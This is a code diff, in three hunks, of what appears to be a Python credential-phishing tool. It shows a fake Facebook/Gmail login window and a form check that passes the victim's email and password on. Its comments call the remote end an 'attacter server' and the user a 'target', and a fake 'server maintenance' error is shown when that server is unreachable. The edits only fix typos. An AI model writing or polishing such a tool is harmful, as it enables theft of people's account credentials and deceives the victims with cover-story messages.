@@ -32,7 +32,7 @@ def btn_Event(isFacebook):
     gwindow.geometry("350x320")
     gwindow.title("Facebook" if isFacebook else "Gmail")
     # check gmail format,gmail is empty or password is empty
-    # if ok, goto login funcition
+    # if ok, goto login function
     def checkForm(gmail,gpass):
         if(gmail == ""):
             result.config(text="Please fill your gmail")
@@ -47,7 +47,7 @@ def btn_Event(isFacebook):
                 else:
                     login(gwindow=gwindow,gmail=gmail,password=gpass,isFacebook=isFacebook)
             except EmailNotValidError:
-                #if gmail format is not invalid, this will be shown
+                #if gmail format is invalid, this will be shown
                 result.config(text="Your gmail is invalid")
     # login form interface
     result = Label(gwindow,text="",font=("Courier",9),foreground="maroon")
@@ -82,4 +82,4 @@ try:
     mainloop()
 except:
     #what if target can't connect to attacter server, this will be shown
-    messagebox.showerror("SERVER ERROR","Server is now in maintainence, Please try again later. Sorry for your inconvience")
+    messagebox.showerror("SERVER ERROR","Server is now in maintainence, Please try again later. Sorry for your inconvenience")
